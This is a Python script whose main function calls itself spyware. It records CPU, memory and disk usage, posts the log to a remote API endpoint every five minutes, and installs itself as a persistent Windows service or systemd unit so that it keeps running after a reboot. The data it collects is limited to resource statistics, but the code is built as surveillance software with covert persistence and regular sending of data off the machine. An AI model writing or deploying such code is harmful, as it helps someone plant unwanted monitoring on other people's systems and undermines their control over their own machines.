import os
import time
import psutil
import requests
import subprocess
from threading import Thread

def monitor_resources(output_file: str):
    while True:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_usage = psutil.virtual_memory().percent
        disk_usage = psutil.disk_usage('/').percent
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        
        with open(output_file, 'a') as f:
            f.write(f"{timestamp} - CPU: {cpu_usage}%, Memory: {memory_usage}%, Disk: {disk_usage}%\n")
        
        time.sleep(60)

def send_data_to_api(output_file: str, api_endpoint: str):
    while True:
        with open(output_file, 'r') as f:
            data = f.read()
        
        try:
            response = requests.post(api_endpoint, data=data)
            if response.status_code == 200:
                with open(output_file, 'w') as f:
                    f.write('')
        except Exception as e:
            print(f"Error sending data to API: {e}")
        
        time.sleep(300)

def create_persistence_service():
    if os.name == 'nt':
        # Windows
        subprocess.run(['sc', 'create', 'ResourceMonitorService', 'binPath=', 'C:\\path\\to\\your\\script.py'], shell=True)
    else:
        # Linux
        with open('/etc/systemd/system/resourcemonitor.service', 'w') as f:
            f.write('[Unit]\n')
            f.write('Description=Resource Monitor Service\n')
            f.write('\n')
            f.write('[Service]\n')
            f.write('ExecStart=/usr/bin/python3 /path/to/your/script.py\n')
            f.write('Restart=always\n')
            f.write('\n')
            f.write('[Install]\n')
            f.write('WantedBy=multi-user.target\n')
        subprocess.run(['systemctl', 'daemon-reload'])
        subprocess.run(['systemctl', 'enable', 'resourcemonitor'])

def spyware_system_resource_monitor(output_file: str, api_endpoint: str) -> None:
    monitor_thread = Thread(target=monitor_resources, args=(output_file,))
    send_data_thread = Thread(target=send_data_to_api, args=(output_file, api_endpoint))
    
    monitor_thread.start()
    send_data_thread.start()
    
    create_persistence_service()

